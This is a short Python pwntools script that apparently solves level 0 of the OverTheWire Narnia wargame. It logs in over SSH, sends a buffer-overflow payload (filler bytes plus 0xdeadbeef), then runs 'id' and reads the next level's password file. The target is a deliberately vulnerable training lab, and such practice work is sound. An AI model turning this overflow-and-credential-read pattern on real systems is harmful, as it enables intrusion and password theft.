#!/usr/bin/env python
#encoding:utf-8

from pwn import *
from utils import *

level = 0
host = 'narnia.labs.overthewire.org'
user = 'narnia%d' % level
bin_file = 'narnia%d' % level
password = 'narnia0'
pass_file = '/etc/narnia_pass/narnia%d' % (level + 1)
bin_path = '/narnia/%s' % bin_file
source_path = '/narnia/%s.c' % bin_file

# context.log_level = 'debug'
shell = ssh(host=host, user=user, password=password)
# Download challenge related files if not exists.
if not os.path.exists(bin_file):
    shell.download_file(bin_path)
    shell.download_file(source_path)

io = shell.run(bin_path)

io.send(NOPS(20) + p32(0xdeadbeef))
io.clean()

io.sendline('id')
log.info('id: %s' % io.recv())
io.sendline('cat %s' % pass_file)
password = io.recv()
log.success('Password: %s' % password)
